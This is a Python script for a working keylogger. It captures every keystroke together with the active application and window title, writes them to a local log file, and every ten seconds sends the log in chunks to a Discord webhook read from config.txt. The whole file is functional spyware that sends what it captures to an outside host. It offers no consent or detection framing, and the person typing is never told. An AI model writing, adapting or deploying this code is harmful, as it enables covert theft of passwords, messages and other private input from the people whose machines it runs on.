import os
import time
import threading
import requests
from pynput import keyboard
from datetime import datetime

# ===========================
# LOAD DISCORD WEBHOOK
# ===========================
if os.path.exists("config.txt"):
    with open("config.txt", "r") as f:
        DISCORD_WEBHOOK = f.read().strip()
else:
    print("[!] No config.txt found. Please run setup_client_discord.bat first.")
    exit(1)

SEND_INTERVAL = 10  # seconds
LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "keystrokes.log")

os.makedirs(LOG_DIR, exist_ok=True)
current_window = None
current_title = None
buffer_lock = threading.Lock()
keystroke_buffer = []
stop_program = threading.Event()

# ===========================
# FUNCTIONS
# ===========================
def send_to_discord(message):
    """Send text to Discord webhook."""
    try:
        payload = {"content": message}
        requests.post(DISCORD_WEBHOOK, json=payload)
    except Exception:
        pass

def get_active_window_info():
    """Return (process_name, window_title)."""
    try:
        import platform, psutil
        if platform.system() == "Windows":
            import ctypes, win32gui
            hwnd = win32gui.GetForegroundWindow()
            pid = ctypes.c_ulong()
            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            proc = psutil.Process(pid.value)
            window_title = win32gui.GetWindowText(hwnd)
            return proc.name(), window_title
    except Exception:
        pass
    return "unknown_app", "unknown_title"

def write_buffer_to_file():
    """Save buffered keystrokes to disk."""
    global keystroke_buffer
    with buffer_lock:
        if keystroke_buffer:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.writelines(keystroke_buffer)
            keystroke_buffer = []

def on_press(key):
    """Log keystrokes + track current app/window title."""
    global current_window, current_title

    # Stop hotkey Ctrl + Alt + P
    if key == keyboard.KeyCode.from_char('p'):
        if any([keyboard.Controller().pressed(keyboard.Key.ctrl_l),
                keyboard.Controller().pressed(keyboard.Key.ctrl_r)]) and \
           any([keyboard.Controller().pressed(keyboard.Key.alt_l),
                keyboard.Controller().pressed(keyboard.Key.alt_r)]):
            print("[*] Stop hotkey detected. Exiting...")
            stop_program.set()
            return False

    proc_name, window_title = get_active_window_info()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with buffer_lock:
        if proc_name != current_window or window_title != current_title:
            current_window = proc_name
            current_title = window_title
            keystroke_buffer.append(f"\n[{timestamp}] App: {current_window} | Window: {current_title}\n")

        if hasattr(key, 'char') and key.char:
            keystroke_buffer.append(key.char)
        else:
            keystroke_buffer.append(f' [{key}] ')

    if len(keystroke_buffer) >= 50:
        write_buffer_to_file()

def send_logs():
    """Send logs to Discord every interval."""
    while not stop_program.is_set():
        try:
            write_buffer_to_file()
            if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
                with open(LOG_FILE, "r", encoding="utf-8") as f:
                    data = f.read()
                for i in range(0, len(data), 1900):
                    send_to_discord(data[i:i+1900])
                open(LOG_FILE, "w").close()
        except Exception:
            pass
        time.sleep(SEND_INTERVAL)

# ===========================
# MAIN
# ===========================
if __name__ == "__main__":
    threading.Thread(target=send_logs, daemon=True).start()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
